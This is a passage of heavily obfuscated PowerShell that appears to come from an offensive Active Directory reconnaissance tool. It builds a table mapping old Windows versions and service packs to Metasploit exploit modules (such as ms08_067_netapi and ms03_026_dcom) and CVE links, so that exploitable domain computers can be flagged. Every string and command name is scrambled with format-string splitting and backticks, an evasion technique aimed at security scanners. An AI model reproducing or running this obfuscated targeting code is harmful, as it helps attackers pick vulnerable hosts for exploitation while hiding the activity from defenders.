        ${cUrreNt`dIsA`BLed} = ${C`Ur`Re`NTu`Acbin}.("{0}{2}{1}" -f 'Su',("{0}{1}"-f 'ri','ng'),'bst')."IN`VOke"(${dis`A`BLEOfFSet},1)

        
        if (${CU`RrEnT`disab`LEd}  -eq 0) {
            
            ${n`ULl} = ${t`ABleaDs`ComPuT`eRs}."ro`ws".("{1}{0}"-f'd','Ad')."i`NVOKE"(${c`URR`EnTHOst},${cur`Ren`Tos},${CU`R`ReNTSP},${C`URr`entl`AsT})
        }
    }

    
    &("{3}{1}{2}{4}{0}" -f 'e',("{1}{0}" -f 'te','ri'),'-Ve','W',("{1}{0}" -f 'bos','r')) ("{9}{3}{8}{10}{15}{2}{11}{16}{7}{0}{4}{6}{12}{1}{13}{14}{5}" -f 'a','g','o','] ','l',("{1}{0}" -f'...','s'),' mi','tic',("{0}{1}"-f'Loadi','ng'),'[*',("{1}{0}{2}"-f'ploit lis',' ex','t'),("{1}{0}" -f'cr','r '),("{1}{0}" -f 'sin','s'),("{1}{0}"-f 't',' pa'),'che',' f','i')

    
    
    

    
    ${TAb`LeEx`ploIts} = &("{0}{1}{3}{2}" -f'N','ew','ct',("{1}{0}" -f 'Obje','-')) ("{2}{4}{1}{3}{0}" -f("{1}{0}"-f 'ble','a'),("{1}{2}{0}"-f '.D','D','ata'),'Sys',("{0}{1}"-f 'a','taT'),("{1}{0}" -f 'em.','t')) 
    ${n`ULl} = ${tA`B`L`EeXPLoitS}."CO`LumNs".("{0}{1}" -f 'Ad','d')."iNvo`KE"(("{1}{4}{3}{0}{2}"-f 'ste','Op','m',("{0}{1}{2}" -f 'a','ti','ngSy'),'er')) 
    ${N`ULL} = ${T`AbLee`XPLoITs}."Colum`Ns".("{0}{1}" -f 'A','dd')."iN`VoKE"(("{0}{2}{1}" -f 'S',("{1}{0}" -f 'k','Pac'),("{0}{1}" -f'er','vice')))
    ${N`ULl} = ${TaBLe`EXp`lo`its}."cOL`UMNs".("{0}{1}" -f 'A','dd')."inVo`Ke"(("{0}{1}{2}" -f'Msf',("{0}{1}"-f'Mo','dul'),'e'))  
    ${n`ULL} = ${tab`lEeX`PLOi`TS}."COlU`M`Ns".("{1}{0}"-f'dd','A')."InV`oKe"('CVE')
    
    
    ${n`ULL} = ${tAb`LEEXpL`oiTS}."r`oWS".("{1}{0}" -f 'd','Ad')."iNV`O`ke"(("{1}{0}{2}" -f 'nd','Wi',("{1}{0}"-f'7','ows ')),"",("{5}{4}{3}{1}{0}{6}{2}" -f("{0}{1}"-f'61','_s'),("{0}{1}" -f'ms1','0_0'),'s',("{2}{0}{1}" -f'ws','/smb/','o'),'d',("{1}{2}{0}" -f 'it/win','exp','lo'),("{1}{0}" -f 'ools','p')),("{7}{0}{5}{3}{1}{4}{2}{6}"-f ("{0}{1}" -f '/ww','w.cv'),'s',("{1}{0}" -f'27','10-'),("{1}{0}"-f'il','ta'),("{3}{2}{1}{0}"-f '/cve/20','m','o','.c'),'ede','29',("{0}{1}" -f'http',':/')))  
    ${n`Ull} = ${TaBlEExp`L`o`i`Ts}."RO`wS".("{0}{1}"-f 'A','dd')."iNV`O`kE"(("{3}{2}{1}{0}"-f '0','200','er ',("{2}{1}{0}{3}" -f 'ows ','nd','Wi','Serv')),("{1}{0}{3}{2}" -f ("{1}{0}" -f' Pa','r'),("{0}{1}" -f 'Ser','ve'),'k 1','c'),("{2}{4}{7}{9}{8}{6}{5}{0}{1}{3}" -f '_','dc','e','om','x',("{0}{1}" -f '3_0','26'),("{1}{2}{0}" -f'rpc/ms0','/d','ce'),'p',("{1}{0}"-f 'indows','/w'),("{0}{1}"-f'loi','t')),("{5}{0}{6}{7}{3}{10}{9}{8}{2}{4}{1}" -f'ww','/','03-',("{1}{0}"-f'ta','ede'),("{0}{1}"-f '03','52'),("{2}{1}{0}"-f'://w','tp','ht'),'.','cv',("{2}{0}{1}"-f '/cve','/20','m'),("{0}{1}"-f 'l','s.co'),'i'))  
    ${nu`Ll} = ${TAb`LEex`P`LOI`Ts}."r`oWs".("{0}{1}" -f'A','dd')."iN`VOKe"(("{0}{2}{1}{3}" -f'Wi',("{2}{1}{0}" -f 'e','ws S','do'),'n',("{1}{0}{2}" -f 'ver 200','r','0')),("{3}{0}{2}{1}"-f 've',("{1}{0}"-f'1','Pack '),'r ','Ser'),("{5}{3}{0}{4}{1}{2}"-f ("{1}{0}{2}"-f't/w','i','in'),'rp',("{1}{3}{2}{0}" -f '_017_msmq','c','ms05','/'),'plo',("{0}{1}"-f 'dows','/dce'),'ex'),("{7}{3}{6}{4}{1}{5}{0}{2}"-f '-0',("{4}{3}{0}{2}{1}"-f'/','200','cve/','ils.com','edeta'),'059','p',("{2}{1}{0}"-f 'v','w.c','/ww'),'5',':/','htt'))  
    ${n`UlL} = ${T`ABL`eExPlOi`TS}."ro`ws".("{0}{1}" -f'A','dd')."I`Nvoke"(("{2}{3}{0}{1}"-f 'e',("{1}{2}{0}"-f '00','rver 2','0'),("{0}{1}" -f 'W','ind'),("{1}{0}"-f'S','ows ')),("{1}{3}{2}{0}{4}"-f ' ','Se','ver','r',("{1}{0}{2}" -f'ac','P','k 1')),("{8}{5}{3}{1}{2}{0}{6}{7}{9}{4}" -f ("{0}{1}" -f 'ws','/i'),'n','do','i',("{2}{0}{1}" -f'bd','av','l_we'),'/w',("{1}{0}"-f '/m','is'),("{2}{0}{1}" -f'3_','007_n','s0'),("{0}{2}{1}" -f'exp','t','loi'),'tdl'),("{9}{0}{6}{5}{4}{7}{11}{1}{2}{8}{10}{3}" -f 'tp:','0','03','09',("{4}{0}{1}{2}{3}{5}"-f'w.cve','de','tai','l','ww','s.c'),'/','/',("{0}{1}{2}" -f 'om','/','cve/'),'-0','ht','1','2'))  
    ${nu`LL} = ${Ta`BlEE`XP`lOIts}."r`owS".("{0}{1}"-f'Ad','d')."INvo`kE"(("{0}{1}{3}{2}"-f ("{0}{2}{1}" -f'Win','ws ','do'),("{0}{1}{2}"-f 'Serve','r',' '),'0','200'),("{3}{0}{2}{1}" -f ' ','k 1','Pac',("{0}{2}{1}"-f'Se','ver','r')),("{8}{7}{1}{6}{3}{4}{2}{5}{0}"-f 's','loi',("{1}{0}"-f'5_w','_04'),("{1}{0}"-f 'indo','/w'),("{1}{2}{0}{3}"-f 's/ms','ws/wi','n','04'),'in','t','p','ex'),("{5}{9}{6}{7}{8}{3}{0}{1}{2}{4}"-f'/2','0','04-','ve',("{0}{1}"-f '10','80/'),'h',("{1}{2}{0}" -f 'a','.cve','det'),("{0}{1}"-f 'il','s.co'),'m/c',("{1}{2}{0}" -f 'ww','t','tp://w')))  
    ${Nu`ll} = ${t`Ableex`plOiTS}."r`oWs".("{0}{1}"-f 'Ad','d')."IN`V`okE"(("{6}{2}{4}{3}{0}{5}{1}"-f'0','0',("{1}{0}" -f'ws S','o'),'r 2',("{0}{1}"-f 'erv','e'),'0',("{0}{1}" -f'W','ind')),("{1}{0}{2}"-f 'er','S',("{1}{2}{0}"-f'k 2','vic','e Pac')),("{7}{2}{0}{3}{9}{8}{6}{4}{1}{10}{5}" -f't',("{2}{1}{0}"-f '_026_','03','s'),'oi','/w',("{1}{0}{2}" -f 'rpc','e','/m'),'com','dc',("{1}{0}"-f'xpl','e'),'s/',("{1}{0}" -f 'ow','ind'),'d'),("{0}{5}{3}{4}{2}{6}{1}" -f("{1}{0}"-f'w','http://w'),("{0}{1}{2}" -f '/cve/2003-035','2','/'),'s.',("{1}{0}"-f'et','ed'),'ail',("{0}{1}"-f'w.','cv'),'com'))  
    ${N`ULl} = ${TA`B`leex`pLoItS}."R`Ows".("{0}{1}"-f 'A','dd')."In`VOKe"(("{3}{1}{0}{2}{4}"-f ' ',("{1}{2}{0}" -f 'er','dows Ser','v'),'2','Win','000'),("{2}{3}{0}{1}"-f 'c','k 2','Se',("{0}{1}{2}"-f 'rv','ice P','a')),("{6}{4}{5}{0}{1}{2}{3}"-f ("{1}{2}{0}"-f '7_','/m','s05_01'),'m','sm','q',("{0}{1}" -f'ndo','ws/'),("{1}{0}" -f 'rpc','dce'),("{0}{2}{1}" -f'expl','/wi','oit')),("{3}{8}{4}{10}{2}{0}{5}{9}{1}{6}{7}"-f ("{0}{1}" -f 'com','/'),("{0}{1}"-f '/','2005-'),'.','ht',("{0}{2}{1}" -f '//','ww.','w'),'cv','005','9','tp:','e',("{0}{1}{2}"-f 'cve','detai','ls')))  
    ${N`Ull} = ${taB`leExP`lOI`TS}."R`OWS".("{0}{1}"-f'Ad','d')."I`NVoKE"(("{1}{2}{0}{3}"-f ' ',("{0}{2}{1}"-f 'Wi','dows Serv','n'),'er',("{1}{0}"-f'000','2')),("{2}{0}{1}"-f' Pa',("{1}{0}"-f'k 2','c'),("{1}{0}" -f'e','Servic')),("{9}{1}{0}{5}{2}{7}{3}{6}{8}{4}"-f '/','t',("{0}{1}" -f'ndo','w'),("{1}{0}" -f's0','/m'),'dav','wi',("{2}{3}{0}{1}{4}"-f'7_nt','dll_','3_0','0','we'),("{0}{1}"-f's/ii','s'),'b',("{0}{1}{2}"-f 'e','xpl','oi')),("{2}{3}{7}{1}{4}{8}{5}{0}{9}{6}"-f ("{2}{3}{0}{1}"-f'0','03-','com/cve','/2'),'/','htt','p',("{0}{1}"-f 'ww','w.c'),("{0}{1}" -f 'a','ils.'),'09',':/',("{1}{0}" -f 't','vede'),'01'))  
    ${NU`lL} = ${tABLE`E`xpLoI`Ts}."R`OwS".("{0}{1}"-f'A','dd')."INVo`ke"(("{2}{0}{3}{1}{5}{4}"-f'nd','v','Wi',("{0}{1}{2}"-f'ows ','S','er'),("{0}{1}"-f'20','00'),'er '),("{0}{2}{1}{3}" -f 'Se',("{0}{1}" -f'v','ice '),'r',("{1}{0}" -f' 2','Pack')),("{1}{3}{6}{5}{8}{2}{4}{7}{0}" -f 's','e','s','xp',("{2}{0}{1}"-f 'smb','/ms04_01','/'),'t','loi',("{2}{1}{0}"-f 'sas','_l','1'),("{0}{1}"-f '/wind','ow')),("{1}{9}{2}{4}{3}{6}{5}{10}{8}{7}{0}"-f'3/',("{0}{1}" -f 'http',':'),("{0}{1}" -f 'ww','w.'),'ede','cv','ls.','tai',("{1}{0}" -f '3','-05'),("{2}{3}{1}{0}"-f'3','200','o','m/cve/'),'//','c'))  
    ${n`UlL} = ${T`ABL`eexpLOIts}."ro`wS".("{1}{0}" -f 'd','Ad')."I`N`VOKe"(("{3}{1}{2}{0}{5}{4}" -f 'w','d','o','Win','00',("{0}{2}{1}"-f 's','ver 20',' Ser')),("{0}{2}{1}{3}" -f 'Se',("{1}{2}{0}"-f' ','ce P','ack'),'rvi','2'),("{0}{4}{3}{5}{2}{1}"-f'exp',("{2}{1}{3}{0}"-f's','5_wi','4_04','n'),'0',("{0}{1}{2}"-f'ndows/wi','ns/','m'),("{2}{0}{1}" -f 't','/wi','loi'),'s'),("{9}{3}{10}{2}{6}{8}{0}{1}{7}{5}{4}" -f '/c','v',("{0}{1}"-f 'etai','ls'),("{1}{2}{0}" -f'v','p://www.','c'),'80/',("{0}{1}"-f'4-1','0'),'.co',("{0}{1}"-f'e','/200'),'m','htt','ed'))  
    ${n`ULl} = ${tA`B`lEexP`lO`iTS}."r`OwS".("{0}{1}"-f 'A','dd')."In`VOKE"(("{0}{3}{4}{1}{2}" -f 'Wi',("{1}{0}"-f'Ser','s '),("{2}{0}{1}" -f 'r',' 2000','ve'),'n','dow'),("{0}{1}{2}{3}"-f("{1}{0}"-f'ervi','S'),("{1}{0}"-f 'Pa','ce '),'ck',' 3'),("{8}{5}{4}{6}{0}{1}{3}{2}{7}"-f 'rpc',("{1}{0}"-f'03_','/ms'),("{0}{1}{2}"-f'26','_d','co'),'0',("{2}{0}{1}" -f '/','wind','t'),'loi',("{2}{0}{1}" -f'w','s/dce','o'),'m','exp'),("{6}{0}{7}{5}{3}{4}{1}{2}"-f ("{1}{0}" -f 'w.','/ww'),'35','2/','m/c',("{1}{0}" -f '2003-0','ve/'),("{0}{1}" -f'ai','ls.co'),("{1}{2}{0}"-f ':/','h','ttp'),("{1}{0}" -f 't','cvede')))  
    ${n`Ull} = ${TAb`lEe`xp`lO`iTS}."R`ows".("{1}{0}" -f'd','Ad')."IN`V`Oke"(("{3}{0}{2}{1}"-f ("{1}{2}{0}" -f's Se','i','ndow'),("{1}{0}" -f '0',' 200'),("{1}{0}"-f'ver','r'),'W'),("{0}{2}{3}{4}{1}"-f'Se','3',("{0}{2}{1}" -f'rvice ','c','Pa'),'k',' '),("{0}{4}{6}{1}{2}{3}{5}"-f 'e','o',("{1}{0}" -f'dcerp','ws/'),("{2}{0}{1}"-f 's0','5_017_','c/m'),("{0}{1}" -f'x','plo'),("{0}{1}"-f 'ms','mq'),("{0}{1}" -f 'it','/wind')),("{1}{6}{3}{2}{5}{4}{0}"-f ("{1}{0}" -f'-0059','5'),("{0}{4}{1}{2}{3}" -f'h','//w','ww','.cv','ttp:'),'co',("{0}{1}" -f'e','tails.'),("{0}{1}{2}" -f'/c','ve/2','00'),'m','ed'))  
    ${nU`Ll} = ${ta`BlEE`Xploi`Ts}."rO`Ws".("{1}{0}"-f 'dd','A')."INV`oke"(("{0}{3}{2}{1}{4}" -f'Win',("{2}{0}{1}" -f 'erver',' ','s S'),'ow','d',("{0}{1}" -f '2','000')),("{2}{0}{1}" -f 'erv',("{2}{0}{1}" -f' ','3','ice Pack'),'S'),("{6}{1}{3}{7}{2}{5}{4}{0}"-f'dav',("{1}{0}"-f'oit','l'),("{2}{1}{0}"-f'0','0','ms03_'),'/w',("{1}{0}"-f'eb','l_w'),("{2}{1}{0}" -f 'l','ntd','7_'),'exp',("{3}{2}{0}{1}"-f 'ws/iis','/','do','in')),("{3}{2}{5}{11}{7}{4}{8}{9}{1}{10}{0}{6}" -f ("{0}{1}" -f'-0','10'),("{1}{0}" -f'ls.c','i'),'p','htt','d',':','9','cve','et','a',("{0}{2}{3}{1}" -f 'o','2003','m/cve','/'),("{1}{0}{2}"-f'ww','//','w.')))  
    ${nU`LL} = ${TaBLEeX`pLO`I`Ts}."Ro`wS".("{1}{0}" -f 'dd','A')."I`N`VoKe"(("{0}{3}{4}{1}{2}" -f("{0}{1}"-f'Windo','ws'),'r',("{0}{1}" -f' ','2000'),("{0}{1}"-f ' S','er'),'ve'),("{1}{0}{3}{2}"-f ("{0}{1}"-f'ce P','a'),("{0}{1}"-f'Serv','i'),'3','ck '),("{0}{2}{3}{5}{1}{8}{4}{7}{6}"-f 'exp','/',("{1}{0}"-f '/w','loit'),("{1}{0}" -f 'ndow','i'),'in','s',("{3}{4}{2}{0}{1}" -f'n','s','5_wi','ms04','_04'),'s/','w'),("{0}{10}{1}{5}{4}{2}{3}{9}{7}{8}{6}{12}{11}"-f 'h',("{1}{0}"-f '/','p:/'),'.',("{0}{1}" -f 'cv','edeta'),'ww','w','/',("{0}{1}"-f's.','co'),("{1}{0}" -f'e','m/cv'),'il','tt',("{0}{1}" -f'4','-1080/'),'200'))  
    ${nU`LL} = ${T`A`B`lEEXploITs}."Ro`ws".("{1}{0}"-f'd','Ad')."I`Nv`OKe"(("{4}{0}{2}{3}{1}" -f'nd','000',("{0}{2}{1}"-f 'ows S','v','er'),("{1}{0}" -f ' 2','er'),'Wi'),("{4}{0}{2}{3}{1}" -f 'ce','4',("{0}{1}"-f' Pa','c'),'k ',("{0}{1}"-f 'Ser','vi')),("{0}{7}{2}{5}{1}{4}{6}{3}" -f 'exp','rpc',("{0}{1}" -f 't/wi','nd'),("{2}{3}{1}{0}" -f'6_dcom','02','0','3_'),'/m',("{1}{0}" -f 'ws/dce','o'),'s','loi'),("{1}{3}{0}{7}{5}{6}{2}{4}"-f 'ww.',("{0}{1}"-f 'http',':'),("{2}{1}{0}" -f'3-03','e/200','v'),'//w','52/','om/','c',("{0}{3}{2}{1}" -f'cved','ails.c','t','e')))  
    ${N`Ull} = ${t`ABLee`X`PLoits}."rO`WS".("{1}{0}" -f'd','Ad')."invO`kE"(("{0}{1}{3}{4}{2}" -f'Win','dow',("{1}{0}"-f '00',' 20'),("{1}{0}"-f 'rv','s Se'),'er'),("{3}{1}{2}{0}{4}" -f'e','r','vic','Se',("{0}{1}" -f' ','Pack 4')),("{8}{10}{3}{0}{1}{5}{2}{9}{6}{7}{4}"-f ("{1}{0}" -f 'o','ind'),("{0}{2}{1}" -f'w','dcer','s/'),'/ms',("{0}{1}{2}" -f'loit','/','w'),'smq','pc','_','m','e',("{2}{0}{1}" -f '5_0','17','0'),'xp'),("{0}{9}{4}{8}{6}{7}{1}{3}{2}{5}" -f'h','m',("{1}{2}{0}"-f'00','e','/2005-'),'/cv',("{1}{0}" -f '/www','/'),'59','tai',("{1}{0}" -f'o','ls.c'),("{1}{0}"-f 'vede','.c'),("{1}{0}"-f':','ttp')))  
    ${Nu`LL} = ${t`AblEExPl`OItS}."Ro`wS".("{1}{0}"-f'dd','A')."inV`O`Ke"(("{2}{3}{5}{1}{4}{0}" -f '00',("{2}{0}{1}" -f've','r','Ser'),'Wi','nd',' 20',("{1}{0}" -f'ws ','o')),("{3}{2}{4}{0}{1}"-f ("{2}{0}{1}" -f 'Pa','ck ',' '),'4',("{1}{0}" -f 'c','rvi'),'Se','e'),("{0}{5}{10}{7}{6}{1}{8}{11}{3}{2}{4}{13}{12}{9}" -f("{0}{2}{1}"-f 'ex','i','plo'),'/',("{0}{1}" -f'ms07','_0'),'/',("{4}{0}{3}{2}{1}" -f '9_m','n','_zone','sdns','2'),'t/w','ows','d',("{1}{0}"-f 'r','dce'),'e','in','pc','m','a'),("{0}{2}{3}{1}{7}{6}{5}{4}" -f'ht',("{0}{1}" -f'vede','ta'),'tp',("{0}{1}{2}" -f'://w','w','w.c'),("{1}{0}"-f'48','17'),("{2}{0}{1}"-f'0','07-','e/2'),("{1}{0}" -f 'm/cv','o'),("{1}{0}"-f'.c','ils')))  
    ${N`Ull} = ${tA`BLE`Ex`P`LoITs}."r`OWS".("{0}{1}"-f'Ad','d')."I`NVoKe"(("{1}{3}{2}{0}{4}" -f 'v','Win',("{2}{1}{0}"-f'Ser',' ','ows'),'d',("{2}{0}{1}" -f '0','0','er 20')),("{0}{1}{2}" -f'Se','rv',("{0}{1}{2}" -f 'i','ce ','Pack 4')),("{4}{1}{0}{6}{3}{10}{5}{7}{8}{2}{9}" -f 'i','o','0',("{1}{0}" -f 's','ndow'),("{1}{0}"-f'xpl','e'),("{0}{1}" -f 'sm','b/m'),("{1}{0}" -f '/wi','t'),'s04','_',("{1}{0}" -f'ss','11_lsa'),'/'),("{5}{6}{1}{3}{2}{4}{0}" -f ("{0}{1}{2}" -f '3','-0','533/'),("{3}{0}{1}{2}"-f 'cved','et','a','w.'),'20',("{3}{0}{1}{2}"-f'om/','c','ve/','ils.c'),'0',("{1}{0}" -f'ttp','h'),("{0}{1}"-f ':','//ww')))  
    ${nu`lL} = ${tA`BlE`ExpLO`ITs}."r`oWs".("{0}{1}" -f 'Ad','d')."I`NvOkE"(("{1}{4}{3}{2}{0}"-f'00','Wi',("{2}{1}{0}" -f'er 20','rv','s Se'),'dow','n'),("{4}{0}{3}{2}{1}" -f'c','4',("{1}{0}" -f'ck ','Pa'),'e ',("{1}{0}" -f'ervi','S')),("{5}{2}{7}{3}{6}{1}{0}{4}" -f'040',("{0}{1}" -f's06','_'),'x','/s',("{1}{2}{0}"-f 'api','_ne','t'),'e',("{0}{1}" -f'mb/','m'),("{1}{2}{4}{3}{0}"-f 'ndows','pl','oit/','i','w')),("{6}{1}{0}{2}{4}{3}{5}"-f("{1}{0}" -f'tai','de'),("{0}{1}" -f '.cv','e'),'ls','2',("{0}{1}{2}"-f'.com/','c','ve/'),("{0}{1}{2}"-f '0','06-','3439'),("{1}{2}{0}" -f'//www','ht','tp:')))  
    ${n`UlL} = ${TaBleE`X`plo`Its}."r`OWs".("{0}{1}" -f 'A','dd')."iNVo`kE"(("{2}{0}{1}{4}{3}"-f'i',("{2}{1}{0}"-f' S','ws','ndo'),'W',("{0}{1}"-f '200','0'),("{1}{0}"-f 'rver ','e')),("{2}{0}{3}{1}"-f("{0}{1}" -f'rv','ice P'),'4','Se',("{0}{1}"-f 'ack',' ')),("{4}{2}{1}{0}{6}{5}{7}{3}" -f'/sm','ws',("{0}{1}" -f '/','windo'),("{0}{1}" -f 'w','api'),("{1}{0}"-f 'xploit','e'),("{1}{0}"-f'_','/ms06'),'b',("{1}{0}"-f '66_n','0')),("{0}{7}{9}{2}{3}{5}{8}{4}{6}{10}{1}" -f 'htt',("{0}{1}" -f'-','4688'),'.cv',("{0}{1}"-f 'ed','et'),("{0}{1}"-f'm','/cv'),'ai','e',("{1}{2}{0}"-f'w','p','://w'),("{0}{1}"-f'ls','.co'),'w',("{0}{1}" -f'/200','6')))  
    ${n`ULL} = ${tablEeX`pL`O`iTs}."RO`ws".("{0}{1}" -f'A','dd')."I`N`VOKe"(("{2}{4}{5}{0}{1}{3}{6}" -f'ver',' 20','Win','0',("{2}{0}{1}" -f'ws ','S','do'),'er','0'),("{0}{3}{1}{2}"-f ("{1}{2}{0}" -f'rvice P','S','e'),'ck ','4','a'),("{8}{6}{5}{0}{3}{2}{4}{7}{1}"-f("{0}{1}"-f'm','b/ms'),'c',("{0}{1}" -f '6_','07'),'0','0_w',("{1}{2}{0}"-f 's/s','ndo','w'),("{2}{0}{1}"-f'i','t/wi','o'),("{1}{0}" -f'sv','ks'),("{1}{0}" -f'xpl','e')),("{6}{3}{7}{0}{1}{2}{5}{4}"-f ("{1}{0}{2}" -f'e','cv','det'),("{1}{0}{2}"-f's.','ail','co'),'m/','ttp',("{0}{2}{1}"-f'06-4','1','69'),("{1}{2}{0}"-f'20','cv','e/'),'h',("{1}{2}{0}"-f '.',':','//www')))  
    ${N`Ull} = ${TAb`LE`expl`OItS}."rO`WS".("{1}{0}"-f 'dd','A')."iNv`oke"(("{0}{3}{1}{2}"-f'Win','v',("{1}{0}"-f'2000','er '),("{1}{2}{0}" -f 'r','dows',' Se')),("{0}{3}{2}{1}"-f'S','k 4',("{0}{1}"-f'e ','Pac'),("{0}{1}" -f'e','rvic')),("{2}{6}{1}{8}{7}{5}{4}{10}{3}{9}{0}"-f ("{1}{0}"-f'i','etap'),'/w',("{1}{0}"-f'o','expl'),'67_','s','ow','it','d','in','n',("{0}{1}{3}{2}"-f '/','s','b/ms08_0','m')),("{7}{8}{1}{3}{0}{2}{5}{4}{6}" -f ("{1}{0}" -f'ai','cvedet'),'w',("{0}{2}{1}"-f'l','com','s.'),'.','e','/cv',("{0}{2}{1}" -f'/200','0','8-425'),("{1}{0}" -f 'tp','ht'),("{1}{0}" -f'w','://w')))  
    ${N`ULl} = ${t`ABl`eEXpl`O`ITS}."RO`Ws".("{0}{1}" -f 'A','dd')."I`N`VOke"(("{5}{0}{4}{3}{1}{2}" -f'nd','ver',("{0}{1}"-f ' ','2000'),'Ser',("{1}{0}"-f's ','ow'),'Wi'),("{2}{1}{3}{0}" -f ("{2}{0}{1}" -f 'k',' 4','e Pac'),'r','Se','vic'),("{4}{0}{6}{2}{7}{1}{5}{3}" -f 'in',("{1}{0}"-f '/ms0','s'),'ws',("{0}{1}" -f'5_','wins'),("{1}{0}{2}" -f'it/','explo','w'),("{1}{0}" -f'4','4_0'),'do',("{0}{1}" -f'/w','in')),("{9}{5}{8}{1}{3}{2}{6}{4}{10}{0}{7}"-f '0',("{1}{0}"-f 'w.c','w'),("{0}{1}{2}"-f'ta','ils.c','om/cv'),("{1}{0}"-f'ede','v'),'2','tp:','e/',("{2}{0}{1}"-f'10','80/','4-'),'//w','ht','0'))  
    ${NU`Ll} = ${T`ABL`eExpL`oI`Ts}."R`oWs".("{0}{1}"-f 'Ad','d')."iN`VoKe"(("{2}{4}{1}{0}{3}"-f '0',' 20',("{0}{1}"-f'Wind','ows '),'0',("{1}{0}"-f 'ver','Ser')),"",("{3}{1}{8}{5}{7}{4}{6}{2}{0}"-f 'com',("{1}{0}"-f 'oit/w','l'),'_d','exp','0','3','26','_',("{3}{2}{0}{1}" -f'm','s0','rpc/','indows/dce')),("{2}{8}{3}{10}{5}{0}{7}{4}{6}{9}{1}"-f("{1}{0}" -f'ils','deta'),'52/','htt','://','m/c','cve',("{2}{0}{1}" -f'e/','2003','v'),'.co','p','-03',("{1}{0}" -f'ww.','w')))  
    ${n`UlL} = ${Ta`BlEexPLO`I`TS}."rO`ws".("{0}{1}"-f 'A','dd')."In`VoKe"(("{4}{0}{2}{1}{3}"-f ("{0}{1}"-f'd','ows'),'00',("{2}{1}{0}"-f'2','r ',' Serve'),'0','Win'),"",("{1}{0}{4}{6}{7}{8}{5}{3}{2}" -f 'p','ex','mq','s','loi',("{0}{1}{2}"-f '5_','017','_m'),'t',("{0}{1}" -f '/wi','nd'),("{1}{2}{0}" -f'ms0','ows/','dcerpc/')),("{5}{6}{2}{1}{4}{0}{3}" -f'20','.co',("{1}{0}{2}" -f'detai','cve','ls'),("{0}{1}"-f '05','-0059'),("{2}{1}{0}"-f'e/','cv','m/'),("{0}{1}"-f'ht','tp:'),("{1}{0}"-f'/www.','/')))  
    ${nu`ll} = ${taBLe`ex`PlOi`Ts}."r`OwS".("{1}{0}" -f'd','Ad')."inVO`Ke"(("{2}{3}{1}{0}"-f ("{1}{0}"-f '000',' 2'),'ver',("{2}{0}{1}" -f 'dows S','e','Win'),'r'),"",("{8}{5}{1}{2}{4}{3}{0}{7}{6}" -f '03_','l',("{0}{1}"-f'oi','t/'),("{1}{0}{2}"-f'm','ows/iis/','s'),("{0}{1}"-f 'w','ind'),'p',("{1}{0}" -f 'av','ebd'),("{0}{2}{1}" -f'0','tdll_w','07_n'),'ex'),("{3}{4}{1}{0}{2}{6}{5}"-f("{0}{1}" -f've','det'),("{1}{0}" -f'c','ww.'),("{1}{0}"-f'c','ails.'),("{1}{0}"-f 'p','htt'),("{1}{0}" -f'//w',':'),'09',("{3}{2}{4}{0}{1}"-f'20','03-01','m','o','/cve/')))  
    ${NU`Ll} = ${TabLEexp`l`OITs}."ro`WS".("{0}{1}"-f 'Ad','d')."I`NVoke"(("{0}{2}{3}{1}"-f 'Wi',("{2}{0}{1}"-f ' 2','000','Server'),'ndo','ws '),"",("{1}{4}{6}{5}{3}{0}{8}{7}{2}" -f'_03',("{0}{1}" -f'e','xploi'),'np',("{1}{0}{2}" -f '/ms','smb','05'),'t','ws/',("{0}{1}" -f '/wind','o'),'_p','9'),("{1}{2}{5}{3}{4}{7}{0}{6}" -f("{1}{0}{2}" -f'005','2','-19'),'ht','t',("{0}{1}{2}"-f'ved','etails.','co'),'m',("{1}{2}{0}" -f'/www.c','p',':/'),'83',("{0}{1}"-f '/cv','e/')))  
    ${NU`lL} = ${tA`Bl`eEX`pL`OITs}."R`OWs".("{0}{1}" -f'A','dd')."i`NvoKE"(("{4}{0}{2}{1}{5}{3}"-f ("{0}{1}" -f'i','ndo'),("{1}{0}"-f'r',' Se'),'ws','00','W',("{0}{1}"-f 'ver ','20')),"",("{4}{6}{3}{1}{5}{2}{0}"-f ("{1}{4}{3}{2}{0}" -f'045_wins','win','ms04_','/','s'),'/','/','oit','ex',("{0}{1}" -f'w','indows'),'pl'),("{3}{5}{4}{1}{6}{0}{2}"-f '08','/20','0/',("{0}{2}{1}{3}{4}"-f 'h','/','ttp:/','www.c','v'),("{0}{1}{2}{3}" -f'ils.','co','m/c','ve'),("{0}{1}"-f 'ed','eta'),("{1}{0}"-f'-1','04')))  
    ${N`ULl} = ${t`AblEE`XP`lOI`Ts}."R`OwS".("{0}{1}"-f'A','dd')."INVo`kE"(("{1}{4}{2}{3}{0}"-f '3',("{0}{3}{2}{1}" -f 'Win','v',' Ser','dows'),' 2','00','er'),("{0}{2}{1}{3}" -f'S',("{1}{0}" -f'a','er P'),'erv',("{1}{0}" -f ' 1','ck')),("{7}{4}{5}{0}{2}{3}{1}{6}"-f("{1}{0}{2}" -f 'ndo','i','ws/'),("{1}{0}" -f'o','ns_z'),("{0}{1}" -f 'd','cer'),("{3}{4}{1}{0}{2}"-f's','m','d','pc/ms07_029','_'),'i','t/w',("{1}{0}{2}" -f 'en','n','ame'),("{1}{0}" -f 'plo','ex')),("{1}{3}{6}{0}{5}{4}{7}{2}"-f ("{2}{1}{0}"-f 'il','edeta','ww.cv'),("{1}{0}" -f':','http'),("{0}{1}" -f'174','8'),'/',("{0}{1}"-f'm/cv','e/2'),("{1}{0}" -f 'co','s.'),'/w',("{0}{1}"-f'00','7-')))  
    ${Nu`LL} = ${tA`BlE`eXpLoItS}."RO`ws".("{0}{1}" -f 'A','dd')."inv`oke"(("{2}{0}{3}{1}"-f's',("{1}{0}"-f'03',' 20'),("{1}{0}"-f 'ndow','Wi'),("{2}{1}{0}"-f 'r','Serve',' ')),("{2}{3}{0}{1}"-f'er',("{1}{0}"-f'ack 1',' P'),'Ser','v'),("{9}{6}{2}{0}{1}{7}{3}{10}{8}{5}{4}" -f ("{0}{1}"-f 'ndows','/s'),'mb/',("{0}{1}"-f 't/w','i'),'_','pi','ta','loi',("{1}{0}" -f '6','ms0'),'ne','exp',("{1}{0}"-f '40_','0')),("{2}{9}{6}{11}{5}{10}{3}{4}{7}{8}{0}{1}"-f("{1}{0}" -f '3','/2006-'),'439','htt',("{1}{0}"-f'i','eta'),'l','e',("{1}{0}"-f'/www.c','/'),("{1}{0}"-f'm','s.co'),("{0}{1}"-f'/','cve'),'p:','d','v'))  
